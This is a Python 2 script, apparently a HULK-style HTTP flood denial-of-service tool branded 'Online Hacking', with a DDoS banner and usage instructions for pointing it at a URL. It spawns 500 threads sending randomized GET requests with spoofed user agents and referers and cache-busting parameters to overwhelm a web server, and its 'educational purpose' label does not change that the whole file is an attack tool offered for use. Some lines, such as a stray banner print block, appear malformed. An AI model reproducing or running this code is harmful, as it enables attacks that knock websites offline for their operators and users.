import urllib2
import sys
import threading
import random
import re

#global params
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://' + host + '/')
	return(headers_referers)
	
#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def usage():
	print ''
	print '\033[93m  How to Use This Tool : \033[92m python2 attack.py <url>'
	print ''
	print ' \033[91m Example - \033[92m python2 attack.py https://www.onlinehacking.oi'
        print ''
	print '\033[97m CGH Cyber Gov Hackers -\033[91m LulzSec / Lizard Squad / Online hacking'
	print "\a"
	print('''\033[92m ---------------------------------------------------''')
print \
"""
print('''\033[92m
                                                                       
DDDDDDDDDDDDD      DDDDDDDDDDDDD                                          
D::::::::::::DDD   D::::::::::::DDD                                       
D:::::::::::::::DD D:::::::::::::::DD                                     
DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D                                    
  D:::::D    D:::::D D:::::D    D:::::D    ooooooooooo       ssssssssss   
  D:::::D     D:::::DD:::::D     D:::::D oo:::::::::::oo   ss::::::::::s  
  D:::::D     D:::::DD:::::D     D:::::Do:::::::::::::::oss:::::::::::::s 
  D:::::D     D:::::DD:::::D     D:::::Do:::::ooooo:::::os::::::ssss:::::s
  D:::::D     D:::::DD:::::D     D:::::Do::::o     o::::o s:::::s  ssssss 
  D:::::D     D:::::DD:::::D     D:::::Do::::o     o::::o   s::::::s      
  D:::::D     D:::::DD:::::D     D:::::Do::::o     o::::o      s::::::s   
  D:::::D    D:::::D D:::::D    D:::::D o::::o     o::::ossssss   s:::::s 
DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  o:::::ooooo:::::os:::::ssss::::::s
D:::::::::::::::DD D:::::::::::::::DD   o:::::::::::::::os::::::::::::::s 
D::::::::::::DDD   D::::::::::::DDD      oo:::::::::::oo  s:::::::::::ss  
DDDDDDDDDDDDD      DDDDDDDDDDDDD           ooooooooooo     sssssssssss    
                                                                          
\033[93m  
   ____        _ _              _    _            _    _             
  / __ \      | (_)            | |  | |          | |  (_)            
 | |  | |_ __ | |_ _ __   ___  | |__| | __ _  ___| | ___ _ __   __ _ 
 | |  | | '_ \| | | '_ \ / _ \ |  __  |/ _` |/ __| |/ / | '_ \ / _` |
 | |__| | | | | | | | | |  __/ | |  | | (_| | (__|   <| | | | | (_| |
  \____/|_| |_|_|_|_| |_|\___| |_|  |_|\__,_|\___|_|\_\_|_| |_|\__, |
                                                                __/ |
                                            Version 2.0         |___/                                                            
           \033[36mWebsite : \033[0m\033[92mwww.onlinehacking.xyz 
           \033[97mTelegram : \033[0m\033[34mhttps://telegram.dog/OnlineHacKing                                              
               \033[95m
     +--------------------------------------+  
     | This Tool  Only Educational Purpose  |  
     +--------------------------------------+  
     | Coded - Online Hacking     [Suman]   |  
     +--------------------------------------+  
"""
print '\033[96m    Ae brother after hacking a weed we crash site '
print ''
print '\033[97m    Stop DDos Attack : CTRL + Z '
print ''
print('''\033[92m ---------------------------------------------------''')

	
#http request
def httpcall(url):
	useragent_list()
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
 			print 'Connected #/ DDos #/ OnlineHacking #/ @Attacker'
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d Backs enrrolados - Attack not Start Loading...." % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n -Neptune Hits are secced"

#execute 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print "Ak 47 attack was been sended This tool is created by : Russian Hackers and Online Hacking"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('http\://([^/]*)/?.*', url)
		host = m.group(1)
		for i in range(500):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()
